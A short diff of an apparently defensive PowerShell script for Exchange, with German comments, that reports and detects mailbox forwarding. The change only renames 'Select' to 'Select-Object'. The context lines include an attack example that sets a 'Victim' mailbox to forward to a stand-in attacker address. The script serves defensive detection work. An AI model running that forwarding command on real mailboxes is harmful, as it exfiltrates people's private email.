@@ -10,7 +10,7 @@ Set-Mailbox -identity Victim -ForwardingSmtpAddress Attacker@threatactor.dev
 -DeliverToMailboxAndForward $true
 
 #REPORT: Alle Mailboxen mit forwardings anzeigen
-Get-Mailbox -ResultSize Unlimited | Where-Object {($Null -ne $_.ForwardingSmtpAddress)} | Select Identity,Name,ForwardingSmtpAddress
+Get-Mailbox -ResultSize Unlimited | Where-Object {($Null -ne $_.ForwardingSmtpAddress)} | Select-Object Identity,Name,ForwardingSmtpAddress
 
 #DETECT: Unified audit Logs
 $logs = Search-UnifiedAuditLog -Operations set-mailbox -StartDate 2022-01-01 -EndDate 2022-06-30
